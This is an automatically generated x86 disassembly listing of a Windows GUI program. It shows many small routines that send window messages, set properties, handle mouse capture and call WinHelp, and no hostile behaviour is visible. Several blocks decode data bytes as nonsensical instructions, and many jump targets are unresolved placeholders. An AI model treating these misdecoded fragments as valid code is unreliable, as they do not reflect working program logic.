push ebx
mov ebx eax
push 0x0
push 0x0
push 0x301
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop ebx
retn
sub_436314
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop ebx
retn
sub_4363ba
jmp sub_4038c0
sub_4363c1
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43645a
jmp sub_4038c0
sub_4365d3
jmp sub_4038c0
sub_436638
push ebx
mov ebx eax
mov eax ebx
call sub_436158
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_443768
pop ebx
retn
sub_436738
push ebx
mov ebx eax
mov eax ebx
call sub_43f7bc
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_436830
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403368
sub_436af3
jmp sub_4038c0
sub_436afa
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436ba4
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
pop esi
retn
sub_436c04
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_43fbb0
pop esi
pop ebx
retn
sub_436ce1
jmp sub_4038c0
sub_436ce8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436f7c
mov al [ eax + 0x224 ]
retn
sub_436f84
push ebx
mov ebx eax
mov eax ebx
call sub_441ca0
xor edx edx
mov eax ebx
call sub_436190
pop ebx
retn
sub_436f9c
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_44396c
sub_436fb0
push esi
mov esi eax
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_436fc0
cmp dl [ eax + 0x225 ]
je r-xdata
retn
mov [ eax + 0x225 ] dl
call sub_44396c
sub_436fd4
cmp dl [ eax + 0x226 ]
je r-xdata
retn
mov [ eax + 0x226 ] dl
call sub_44396c
sub_43701c
call sub_4456d8
retn
sub_4370fa
jmp sub_4038c0
sub_4371a4
mov eax [ r-xdata ]
retn
sub_4371ac
xor eax eax
retn
sub_4371b0
retn
sub_4372c8
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44396c
sub_437340
push ebx
mov ebx eax
mov eax ebx
call sub_457570
test eax eax
je r-xdata
mov eax ebx
call sub_441120
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_437364
xor eax eax
retn
sub_43742b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x40b1173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_437444
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403368
sub_437535
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_43753e
jmp sub_4038c0
j_sub_437535
jmp sub_437535
sub_437545
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437618
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
pop ebx
retn
sub_4376f8
jmp sub_4038c0
sub_4376ff
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43778b
jmp sub_4038c0
sub_437792
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4378d1
jmp sub_4038c0
sub_4378d8
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43796d
jmp sub_4038c0
sub_437974
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43797c
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_403368
pop esi
retn
sub_437aba
jmp sub_4038c0
sub_437adc
jmp sub_4038c0
sub_437ae3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437aec
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_403368
pop esi
retn
sub_437c56
jmp sub_4038c0
sub_437c73
jmp sub_4038c0
sub_437c7a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437e2b
jmp sub_4038c0
sub_437e32
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437e80
push esi
mov si 0xffb1
call sub_403368
pop esi
retn
sub_437e8c
push esi
mov si 0xffb0
call sub_403368
pop esi
retn
sub_437ee0
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_43804b
jmp sub_4038c0
sub_438052
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43819c
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_4381c0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop ebx
retn
sub_438294
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_44396c
sub_4382ac
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_44396c
sub_4382c8
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_44396c
sub_4383dc
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_44396c
sub_43843c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop ebx
retn
sub_438500
jmp sub_4038c0
sub_438507
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4385a2
jmp sub_4038c0
sub_4385a9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4385b0
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_44396c
sub_438c50
push ebx
mov ebx eax
mov eax ebx
call sub_4449b8
mov eax ebx
call sub_4380c8
pop ebx
retn
sub_438dd0
jmp sub_4038c0
sub_438dd7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_438de0
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_4391f4
jmp sub_4038c0
sub_4391fb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4392d8
jmp sub_4038c0
sub_4392df
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4392e8
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_439379
jmp sub_4038c0
sub_439380
pop ebp
retn
sub_439384
sub [ rw-data ] 0x1
retn
sub_43940e
inc ecx
add [ eax + esi * 8 + 0x41 ] bh
add [ eax + esi * 8 - 0xf7fffbf ] ch
inc ecx
add [ esp + edi * 4 ] bl
inc esp
add [ esp + eax * 8 + 0x44 ] cl
add ah ah
retn
sub_4394e1
jmp sub_4038c0
sub_4394e8
pop ebp
retn
sub_4394ec
sub [ rw-data ] 0x1
retn
sub_4394f4
xchg esi eax
dec eax
add bl ah
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_439d6c
sub_439505
add eax 0xffffffe0
jmp sub_439aec
sub_43950d
add eax 0xffffffe0
jmp sub_439b54
sub_439515
add eax 0xffffffe0
jmp sub_439c68
sub_43951d
add eax 0xffffffe0
jmp sub_439cdc
sub_439525
add eax 0xffffffe0
jmp sub_439798
sub_43952d
add eax 0xffffffe0
jmp sub_4397ac
sub_439535
add eax 0xffffffe0
jmp sub_439824
sub_43953d
add eax 0xffffffe0
jmp sub_4398c8
sub_439545
add eax 0xffffffe0
jmp sub_4398cc
sub_43954d
add eax 0xffffffe0
jmp sub_439954
sub_439555
add eax 0xffffffe0
jmp sub_439a9c
sub_43955d
add eax 0xffffffe0
jmp sub_439aa0
sub_439565
add eax 0xffffffe0
jmp sub_439abc
sub_439577
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4059a4
sub_439581
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4059b8
sub_439755
jmp sub_4038c0
sub_43975c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439798
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403f94
pop ebx
retn
sub_439813
jmp sub_4038c0
sub_43981a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4398ac
jmp sub_4038c0
sub_4398b3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4398c8
mov al 0x1
retn
sub_439947
jmp sub_4038c0
sub_43994e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439a4c
jmp sub_4038c0
sub_439a53
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439a9c
mov [ eax + 0xc ] edx
retn
sub_439aa0
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_439b44
jmp sub_4038c0
sub_439b4b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439c4a
jmp sub_4038c0
sub_439c51
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439cca
jmp sub_4038c0
sub_439cd1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439d5c
jmp sub_4038c0
sub_439d63
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439e57
jmp sub_4038c0
sub_439e5e
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_439f20
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_439e6c
call EnumWindows
retn
sub_439fb2
jmp sub_4038c0
sub_439fb9
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_439fc4
xor eax eax
retn
sub_43a0bd
jmp sub_4038c0
sub_43a0c4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a1ae
jmp sub_4038c0
sub_43a1b5
pop ebp
retn
sub_43a20a
jmp sub_4038c0
sub_43a211
pop ebp
retn
sub_43a7ab
add [ eax + 0x480043ea ] ch
rol [ eax + eax + 0x5c ] 0xc0
inc esp
add al ah
0xc0840043 0x44
sub_43b394
jmp r-xdata
sub_43b396
0xe8ffe9ff 0xe7ff
sub_43b39d
jmp esi
sub_43b6eb
add [ eax + 0x480043ea ] ch
rol [ eax + eax + 0x5c ] 0xc0
inc esp
add al ah
0xc0840043 0x44
sub_43c455
add eax 0xffffff8c
jmp sub_448a98
sub_43c45d
add eax 0xffffff8c
jmp sub_448a9c
sub_43c465
add eax 0xffffff8c
jmp sub_448b88
sub_43c46d
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_43c47a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_43c487
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_43c494
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_43c4a1
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_43c4ae
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43c4bb
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_43c4c8
add eax 0xffffff8c
jmp sub_44a1f8
sub_43c4da
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4059a4
sub_43c4e4
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4059b8
sub_43c93c
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43cc4f
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_417944
retn
sub_43cc6c
push 0x15
mov ecx rw-data
call sub_417904
retn
sub_43cd58
call GetCapture
call sub_43ca3c
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43cfbc
push ebx
push eax
push sub_43d140
call sub_41f824
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43cfd4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43d004
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41f8d8
pop ebx
retn
sub_43d0e2
jmp sub_40360c
sub_43d114
xor eax eax
retn
sub_43d118
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43d130
retn
sub_43d134
mov eax [ rw-data ]
retn
sub_43d13c
retn
sub_43d16a
jmp sub_40360c
sub_43d16f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46040c
call sub_403974
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d18c
call sub_4033c4
xor eax eax
mov [ rw-data ] eax
retn
sub_43d19c
call sub_4033c0
xor eax eax
mov [ rw-data ] eax
retn
sub_43d1ac
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403490
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43d25c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_43d274
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43d2c0
retn
sub_43d478
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403368
pop esi
retn
sub_43d48c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403368
pop esi
retn
sub_43d4a0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43d4ac
mov eax 0x4
retn
sub_43d4b4
retn
sub_43e0a5
jmp sub_40360c
sub_43e392
jmp sub_4038c0
sub_43e404
jmp sub_4038c0
sub_43e410
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43e138
sub_43e58f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4228c4
retn
sub_43e5a5
jmp sub_4038c0
sub_43e5cc
jmp sub_4038c0
sub_43e64e
jmp sub_4038c0
sub_43e676
jmp sub_4038c0
sub_43e67d
mov esp ebp
pop ebp
retn
sub_43e735
jmp sub_4038c0
sub_43e78c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43e758
mov [ ebx + 0x58 ] esi
sub_43e8e0
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43e8f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43e9dd
jmp sub_4038c0
sub_43e9e4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ea67
jmp sub_4038c0
sub_43ea6e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43ee3c
xor eax eax
retn
sub_43ee40
mov al [ eax + 0x58 ]
retn
sub_43ee44
xor eax eax
retn
sub_43ee48
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43ee50
mov eax [ eax + 0x30 ]
retn
sub_43eef4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43efa0
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43efb8
mov [ eax + 0x5d ] dl
retn
sub_43efbc
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_442bd0
sub_43efcc
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43f4af
jmp sub_4038c0
sub_43f4b6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f518
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43f59c
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43f6b9
jmp sub_4038c0
sub_43f6c0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f7bc
push eax
xor ecx ecx
mov edx 0xb037
call sub_440d98
retn
sub_43f97d
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403368
sub_43fa2e
jmp sub_4038c0
sub_43fa35
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43fb0c
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_440d98
sub_43fb24
push 0x0
xor ecx ecx
mov edx 0xe
call sub_440d98
retn
sub_43fb34
push edx
mov edx 0xd
call sub_440d98
retn
sub_43fb40
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43fb54
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43fc35
jmp sub_4038c0
sub_43fc3c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43fc44
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_440d98
sub_43fcb4
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_43fcc8
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43fcd4
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_43fcdc
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_440d98
sub_43fd00
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_440d98
sub_43fd24
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_440d98
sub_43fd6c
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43fd74
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_440d98
sub_43fd98
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_440d98
sub_43fdbc
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_440d98
sub_43fdd8
push ebx
mov ebx eax
call sub_43cd58
cmp ebx eax
sete al
pop ebx
retn
sub_43fe10
push esi
mov dl 0x1
mov si 0xffce
call sub_403368
pop esi
retn
sub_43ff5a
jmp sub_4038c0
sub_43ff61
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440084
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_43fff8
retn
sub_4400d8
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_4400ec
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_4401d1
jmp sub_4038c0
sub_4401f0
xor eax eax
retn
sub_4401f4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44020c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_440224
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_440240
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_440258
retn
sub_440350
retn
sub_440354
cmp eax [ rw-data ]
sete al
retn
sub_4403c8
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_4404e4
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403368
pop esi
pop ebp
retn 0x4
sub_440524
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_4407bb
jmp sub_4038c0
sub_4407c2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4407cc
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403368
pop esi
retn
sub_4407e0
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403368
pop esi
retn
sub_440aaf
jmp sub_4038c0
sub_440b58
push esi
mov si 0xffee
call sub_403368
pop esi
retn
sub_440b64
mov al 0x1
retn
sub_440e3c
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_43f204
retn
sub_440e60
retn
sub_441079
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41ba3c
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_441094
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41dd74
retn
sub_44118c
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_4417a4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4417ac
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4417b4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44186c
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44188c
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43fd00
mov [ ebx + 0x9a ] 0x1
sub_4418e4
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43fca4
mov [ ebx + 0x56 ] 0x1
sub_441908
mov [ edx + 0xc ] 0x1
retn
sub_441910
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_440d98
sub_441928
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_440d98
sub_441940
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_441ba6
jmp sub_4038c0
sub_441bad
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441bd8
mov eax [ r-xdata ]
retn
sub_441d74
jmp sub_4038c0
sub_441d7b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441e9c
mov eax [ eax + 0xb8 ]
retn
sub_441f04
push ebx
mov ebx eax
mov eax ebx
call sub_4401f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_441f20
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4420b8
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4420e8
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_4420f0
call sub_43ec70
retn
sub_4421f0
jmp sub_4038c0
sub_4423b0
jmp sub_4038c0
sub_442400
jmp sub_4038c0
sub_442438
retn
sub_4426c1
jmp sub_4038c0
sub_442849
jmp sub_4038c0
sub_442bab
jmp sub_4038c0
sub_442c57
jmp sub_4038c0
sub_442c64
inc [ eax + 0x160 ]
retn
sub_442c6c
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_442c8c
sub_442c8c
xor edx edx
call sub_442bd0
retn
sub_442d59
jmp sub_4038c0
sub_442d60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442e4f
jmp sub_4038c0
sub_443376
jmp sub_4038c0
sub_44337d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443545
jmp sub_4038c0
sub_44354c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443620
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_44380d
jmp sub_4038c0
sub_443814
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_443904
xor eax eax
retn
sub_44396c
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_440d98
sub_443a9a
jmp sub_40360c
sub_443bcf
jmp sub_4038c0
sub_443bd6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443be0
jmp sub_40360c
sub_443be5
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46040c
call sub_403974
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4441a0
jmp sub_4038c0
sub_4441a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4441b0
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
